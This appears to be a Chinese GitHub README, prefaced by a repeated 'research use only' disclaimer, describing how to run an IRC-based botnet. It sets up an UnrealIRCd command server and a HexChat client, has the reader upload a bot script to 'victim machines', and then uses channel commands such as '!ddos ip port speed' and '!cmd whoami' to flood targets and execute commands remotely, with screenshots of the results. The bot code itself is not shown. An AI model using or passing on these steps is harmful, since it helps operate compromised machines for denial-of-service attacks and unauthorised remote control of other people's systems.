# 利用IRC批量控制肉鸡


**仅限用于合法和学习研究用途!仅限用于合法和学习研究用途!仅限用于合法和学习研究用途!严禁任何未授权利用!**
**仅限用于合法和学习研究用途!仅限用于合法和学习研究用途!仅限用于合法和学习研究用途!严禁任何未授权利用!**
**仅限用于合法和学习研究用途!仅限用于合法和学习研究用途!仅限用于合法和学习研究用途!严禁任何未授权利用!**

## 安装unrealircd
安装unrealircd在服务器上，本机用的centos做实验，Ubuntu下载方式多些更容易一些

```
wget https://www.unrealircd.org/downloads/unrealircd-5.0.3.1.tar.gz
tar zxvf unrealircd-5.0.3.1.tar.gz
./Config
cd /unrealircd
cp conf/examples/example.conf conf/unrealircd.conf
根据https://www.unrealircd.org/docs/Configuration_file_syntax配置
./unrealircd gencloak
记住密钥
./unrealircd mkpasswd
设置并记住密码
vi conf/unrealircd.conf
修改对应文件账密密钥及ip信息
./unrealircd rehash
配置应用
./unrealircd configtest
测试启动
./unrealircd start
启动
```



```
tail -f /home/irc/unrealircd/logs/ircd.log#查看日志
```

## 安装hexchat

下载hexchat[Downloads – HexChat](https://hexchat.github.io/downloads.html)

连接 ip/port（记得点enter才会保存）

<img width="952" height="683" alt="屏幕截图 2025-12-03 163743" src="https://github.com/user-attachments/assets/decfab4d-be92-41cd-8634-ecae2794d773" />


/join #bot

## 脚本

上传代码至受害机

## 攻击流程及实验结果

在hexchat上输入!ddos ip port speed
<img width="523" height="85" alt="image-20251202155732002" src="https://github.com/user-attachments/assets/1e01fcaa-3fc5-4356-bfbc-9a8fc8abe32b" />

!stop停止攻击

命令执行
!cmd dir 或！cmd whoami测试

<img width="481" height="326" alt="屏幕截图 2025-12-03 163545" src="https://github.com/user-attachments/assets/466a396d-5bee-4638-a5e1-03d75b1239a5" />


在攻击机上

```
 tcpdump -i any 'udp port 5001' -n#ddos流量
```


<img width="603" height="133" alt="image-20251202154017607" src="https://github.com/user-attachments/assets/58fb953c-c591-4bca-9024-cc18476f1654" />


